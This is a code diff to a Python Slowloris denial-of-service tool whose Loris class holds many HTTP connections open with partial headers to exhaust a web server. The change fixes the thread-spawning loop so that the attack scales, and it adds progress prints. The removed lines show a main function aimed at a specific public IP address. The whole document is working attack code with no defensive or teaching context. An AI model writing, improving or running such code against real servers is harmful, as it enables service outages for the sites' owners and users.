@@ -31,10 +31,12 @@ class Loris:
 
         i = 0
         while i < self.totalConnections:
+            print "starting a thread for connections " +\
+            str(i) + " through " + str(i + self.connectionsPerThread)
             t = threading.Thread(target = self.doConnections)
             t.start()
             self.threadList.append(t)
-            i += self.totalConnections
+            i += self.connectionsPerThread
 
     """
     Call this to cancel the attack and free all connections
@@ -88,8 +90,10 @@ class Loris:
                     try:
                         sockets[i] = socket.create_connection((self.addr, self.port))
                         working[i] = True
+                        print "Connection success!"
                     except:
                         working[i] = False
+                        print "Failure establishing connection"
                 if working[i]:
                     payload = "GET HTTP/1.1\r\n" +\
                     "Host: " + str(self.addr) + ":" + str(self.port) + "\r\n" +\
@@ -98,8 +102,10 @@ class Loris:
                     if sockets[i] is not None:
                         try:
                             sockets[i].send(payload)
+                            print "Header success!"
                         except:
                             working[i] = False
+                            print "Failure sending header"
 
             """ Send data """
             for i in range(0, self.connectionsPerThread):
@@ -109,33 +115,10 @@ class Loris:
                         message = "X-a: b\r\n"
                         try:
                             sock.send(message)
+                            print "Increment success!"
                         except:
                             working[i] = False
+                            print "Failure sending increment"
 
             """ Sleep for timeout """
             time.sleep(self.timeout)
-
-"""
-This class exists so that it's possible to call off a DDoS
-attack: calling kill() on a thread will set a flag (checked
-on a regular basis) that tells the thread to halt execution,
-which will in turn free the established connections.
-"""
-class KillableThread(threading.Thread):
-
-    def __init__(self):
-        super(KillableThread, self).__init__()
-        self.kill = threading.Event()
-
-    def kill(self):
-        self.kill.set()
-
-    def killed(self):
-        return self.kill.isSet()
-
-def main():
-    loris = Loris(addr = "107.150.39.234", port = 80, totalConnections = 200)
-    loris.initiateAttack()
-
-if __name__ == "__main__":
-    main()
